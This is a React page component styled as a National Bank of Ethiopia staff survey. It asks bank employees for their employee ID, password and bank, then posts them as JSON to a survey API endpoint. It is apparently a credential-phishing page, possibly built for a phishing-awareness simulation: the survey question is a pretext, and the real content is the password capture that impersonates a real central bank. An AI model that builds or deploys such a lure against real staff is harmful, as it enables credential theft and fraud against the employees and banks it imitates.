"use client";

import { useState } from "react";
import { safeApiCall } from "@/lib/safeApiCall";

const BANKS = [
  "Nisir Bank S.C.",
  "Commercial Bank of Ethiopia",
  "Awash Bank",
  "Dashen Bank",
  "Bank of Abyssinia",
  "Wegagen Bank",
  "United Bank",
  "Nib International Bank",
  "Cooperative Bank of Oromia",
  "Zemen Bank",
  "Lion International Bank",
  "Oromia International Bank",
  "Berhan Bank",
  "Bunna International Bank",
  "Abay Bank",
  "Addis International Bank",
  "Debub Global Bank",
  "Enat Bank",
  "Hijra Bank",
  "Siinqee Bank",
  "Amhara Bank",
  "Tsehay Bank",
  "Goh Betoch Bank",
  "Ahadu Bank",
];

const EASE_OPTIONS = ["Very Easy", "Easy", "Neutral", "Difficult", "Very Difficult"];

export default function NbeSurveyPage() {
  const [step, setStep] = useState("intro");
  const [form, setForm] = useState({ employeeId: "", password: "", bankName: "", easeRating: "" });
  const [submitting, setSubmitting] = useState(false);

  function submit(e) {
    e.preventDefault();
    setSubmitting(true);
    safeApiCall(() =>
      fetch("/api/nbe-survey/submit", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(form),
      })
    ).finally(() => {
      setSubmitting(false);
      setStep("done");
    });
  }

  return (
    <main className="min-h-screen bg-[#fbfbfa] text-[#222] py-10 px-4">
      <div className="max-w-xl mx-auto">
        <div className="flex items-center gap-2 mb-6">
          <div className="h-9 w-9 rounded bg-[#1d3557] text-white flex items-center justify-center text-xs font-bold">
            NBE
          </div>
          <div>
            <p className="text-[13px] font-bold text-[#1d3557]">National Bank of Ethiopia</p>
            <p className="text-[11px] text-gray-500">2026 Staff Awareness Survey</p>
          </div>
        </div>

        <div className="bg-white border border-gray-200 p-6 sm:p-8 font-serif">
          {step === "done" ? (
            <p className="text-sm font-semibold text-[#1d3557]">
              Thank you. Your response has been recorded.
            </p>
          ) : (
            <form onSubmit={submit} className="space-y-4">
              <p className="text-sm text-gray-700 mb-2">
                Please provide your details to verify your institution, then complete the brief survey below.
              </p>

              <input
                type="text"
                placeholder="Enter Employee ID e.g EMP-001"
                required
                value={form.employeeId}
                onChange={(e) => setForm((f) => ({ ...f, employeeId: e.target.value }))}
                className="w-full border border-gray-300 px-3 py-2 text-sm font-sans"
              />
              <input
                type="password"
                placeholder="Employee Password"
                required
                value={form.password}
                onChange={(e) => setForm((f) => ({ ...f, password: e.target.value }))}
                className="w-full border border-gray-300 px-3 py-2 text-sm font-sans"
              />
              <select
                required
                value={form.bankName}
                onChange={(e) => setForm((f) => ({ ...f, bankName: e.target.value }))}
                className="w-full border border-gray-300 px-3 py-2 text-sm font-sans"
              >
                <option value="" disabled>
                  Select your bank
                </option>
                {BANKS.map((bank) => (
                  <option key={bank} value={bank}>
                    {bank}
                  </option>
                ))}
              </select>

              <hr className="border-gray-200" />

              <SurveyQuestion
                label="How would you rate Nisir Bank SETA portal's ease of use?"
                value={form.easeRating}
                onChange={(v) => setForm((f) => ({ ...f, easeRating: v }))}
              />

              <button
                type="submit"
                disabled={submitting}
                className="bg-[#1d3557] hover:bg-[#16294a] disabled:opacity-60 text-white text-sm font-bold font-sans px-5 py-2.5"
              >
                {submitting ? "Submitting…" : "Submit Survey"}
              </button>
            </form>
          )}
        </div>

        <p className="text-[11px] text-gray-400 mt-4 font-sans">
          National Bank of Ethiopia — Addis Ababa, Ethiopia
        </p>
      </div>
    </main>
  );
}

function SurveyQuestion({ label, value, onChange }) {
  return (
    <div>
      <p className="text-sm text-gray-700 mb-1.5">{label}</p>
      <select
        required
        value={value}
        onChange={(e) => onChange(e.target.value)}
        className="w-full border border-gray-300 px-3 py-2 text-sm font-sans"
      >
        <option value="" disabled>
          Select a rating
        </option>
        {EASE_OPTIONS.map((opt) => (
          <option key={opt}>{opt}</option>
        ))}
      </select>
    </div>
  );
}
